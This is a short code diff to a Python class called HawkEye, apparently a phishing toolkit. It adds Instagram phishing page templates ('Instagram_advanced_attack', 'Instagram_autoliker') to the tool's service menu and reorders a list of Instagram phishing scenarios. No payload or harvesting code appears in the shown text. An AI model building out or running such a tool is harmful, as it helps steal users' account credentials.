@@ -26,7 +26,12 @@ class HawkEye(object):
                 'google_advanced_poll',
                 'google_advanced_web'
             ],
-            'Snapchat': ['Snapchat_web']
+            'Snapchat': ['Snapchat_web'],
+            'Instagram': [ 
+                'Instagram_web',
+                'Instagram_advanced_attack',
+                'Instagram_autoliker'
+            ]
         }
 
         
@@ -104,8 +109,8 @@ class HawkEye(object):
 
             self.attack_vectors[5]: [
                 'Standard Phishing Page',
-                'Instagram Autolinker Phishing',
-                'Instagram Advanced Scenario'
+                'Instagram Advanced Scenario',
+                'Instagram Autolinker Phishing'
             ]
         }
 
@@ -114,6 +119,7 @@ class HawkEye(object):
         if attack_vector in [k for k in extra_options]:
             for ind, option in enumerate(extra_options[attack_vector]):
                 print(f" [{BLUE}{ind}{DEFAULT}] [{option}]")
+
             while True:
                 try: 
                     selected = int(input(f"\nSay Something {self.select_arrow}"))
